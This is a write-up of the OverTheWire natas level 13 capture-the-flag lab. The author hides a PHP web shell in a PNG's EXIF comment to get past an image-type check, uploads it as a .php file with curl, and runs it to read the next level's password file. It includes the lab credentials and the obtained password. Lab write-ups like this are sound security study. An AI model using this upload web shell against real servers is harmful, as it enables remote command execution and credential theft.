# natas level13
natas is CTF with web application.
password will be stored in `/etc/natas_webpass/natas13`.

## using credential is below.
- User:natas13
- Pass:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

## using tools.
- shell(curl, base64, etc)
- lynx
- exiftool
check web site by lynx.
`lynx http://natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY@natas13.natas.labs.overthewire.org`

this web page like a natas12, but this page has function of file checking(image or not).
~~~
   } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
       echo "File is not an image";
~~~

And I think php code hidden into exif of uploaded file.
At first, I download png file with name of "pic.png".
and I modify exif by following command.
`/bin/exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' ./pic.png`

And I upload it by following command, URL of this is 

`curl -X POST http://natas13.natas.labs.overthewire.org/index.php -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY -F submit=1 -F filename=jpeg.php -F MAX_FILE_SIZE=1000 -F "uploadedfile=@./jpeg.jpg;type=image/jpg"`

response has following message. Maybe I can use web shell on this URL.
`The file <a href="upload/khbg2r7ksm.php">upload/khbg2r7ksm.php</a> has been uploaded<div id="viewsource">`

And I got password by following command.
`curl -X GET 'http://natas13.natas.labs.overthewire.org/upload/khbg2r7ksm.php?cmd=cat%20/etc/natas_webpass/natas14' -u natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY --output test.bin`

password include in test.bin.
password:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

